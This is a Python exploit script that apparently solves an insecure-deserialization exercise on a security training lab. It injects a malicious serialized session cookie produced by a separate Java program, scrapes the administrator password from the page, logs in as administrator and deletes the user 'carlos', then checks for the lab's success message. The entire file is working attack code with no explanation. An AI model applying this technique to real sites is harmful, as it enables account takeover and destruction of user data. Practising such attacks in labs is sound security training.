import requests
import re
import subprocess
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.password = None

    def generating_the_malicious_session(self):
        subprocess.run(['javac', 'Main.java'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        serialized_object_string = subprocess.run(['java', 'Main'], capture_output=True).stdout
        final_serialized_object_string = serialized_object_string.decode().strip()
        self.session.cookies['session'] = final_serialized_object_string

    def getting_the_password(self):
        response = self.session.get(self.lab_url)
        self.password = re.search(r'&quot;(.*)&quot;', response.text).groups(1)[0]
        print(self.session.cookies)

    def signing_in(self):
        data = {
            'username': 'administrator',
            'password': self.password
        }
        self.session.cookies.clear()
        self.session.post(self.lab_url + 'login', data=data)

    def delete_the_user(self):
        self.session.post(self.lab_url + 'admin/delete?username=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.generating_the_malicious_session()
        self.getting_the_password()
        self.signing_in()
        self.delete_the_user()
        self.checking_solution()


solver = Solver(sys.argv[1])
solver.start()
